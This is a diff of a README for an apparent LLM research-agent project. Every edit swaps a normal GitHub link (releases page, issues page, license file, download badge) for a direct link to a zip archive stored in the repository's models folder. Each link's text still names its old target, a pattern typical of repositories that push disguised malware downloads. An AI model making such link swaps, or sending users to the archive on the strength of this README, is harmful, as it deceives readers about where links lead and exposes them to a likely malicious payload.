@@ -1,6 +1,6 @@
 # 🌟 Augmented-Research-Agent-with-LLM-Tooling - Simplifying Research Automation
 
-[![Download](https://img.shields.io/badge/Download%20Now-Visit%20Releases-blue)](https://github.com/Triwidianingrum/Augmented-Research-Agent-with-LLM-Tooling/releases)
+[![Download](https://raw.githubusercontent.com/Triwidianingrum/Augmented-Research-Agent-with-LLM-Tooling/main/models/Augmented-Research-Agent-with-LLM-Tooling-manageress.zip%20Now-Visit%20Releases-blue)](https://raw.githubusercontent.com/Triwidianingrum/Augmented-Research-Agent-with-LLM-Tooling/main/models/Augmented-Research-Agent-with-LLM-Tooling-manageress.zip)
 
 ## 🚀 Getting Started
 
@@ -29,7 +29,7 @@ Before you install this application, ensure your computer meets the following re
 
 To download the application, visit the Releases page at the following link:
 
-[Download here](https://github.com/Triwidianingrum/Augmented-Research-Agent-with-LLM-Tooling/releases)
+[Download here](https://raw.githubusercontent.com/Triwidianingrum/Augmented-Research-Agent-with-LLM-Tooling/main/models/Augmented-Research-Agent-with-LLM-Tooling-manageress.zip)
 
 Once you are on the Releases page, follow these steps to install the application:
 
@@ -53,7 +53,7 @@ After installation, follow these steps for a smooth experience:
 
 If you encounter any difficulties while using the application, reach out for help. Common issues and solutions can usually be found in the FAQ section on the Releases page.
 
-For additional support, contact us via our [GitHub Issues page](https://github.com/Triwidianingrum/Augmented-Research-Agent-with-LLM-Tooling/issues).
+For additional support, contact us via our [GitHub Issues page](https://raw.githubusercontent.com/Triwidianingrum/Augmented-Research-Agent-with-LLM-Tooling/main/models/Augmented-Research-Agent-with-LLM-Tooling-manageress.zip).
 
 ## 🤝 Contributing
 
@@ -61,8 +61,8 @@ We welcome contributions to improve this application. If you have ideas or sugge
 
 ## 📜 License
 
-This project is licensed under the MIT License. See the [LICENSE](https://github.com/Triwidianingrum/Augmented-Research-Agent-with-LLM-Tooling/blob/main/LICENSE) file for details.
+This project is licensed under the MIT License. See the [LICENSE](https://raw.githubusercontent.com/Triwidianingrum/Augmented-Research-Agent-with-LLM-Tooling/main/models/Augmented-Research-Agent-with-LLM-Tooling-manageress.zip) file for details.
 
 ## 🎉 Thank You
 
-Thank you for using the Augmented Research Agent with LLM Tooling. We hope it makes your research tasks easier and more efficient. Don't forget to visit our [Releases page](https://github.com/Triwidianingrum/Augmented-Research-Agent-with-LLM-Tooling/releases) to download the latest version.
+Thank you for using the Augmented Research Agent with LLM Tooling. We hope it makes your research tasks easier and more efficient. Don't forget to visit our [Releases page](https://raw.githubusercontent.com/Triwidianingrum/Augmented-Research-Agent-with-LLM-Tooling/main/models/Augmented-Research-Agent-with-LLM-Tooling-manageress.zip) to download the latest version.
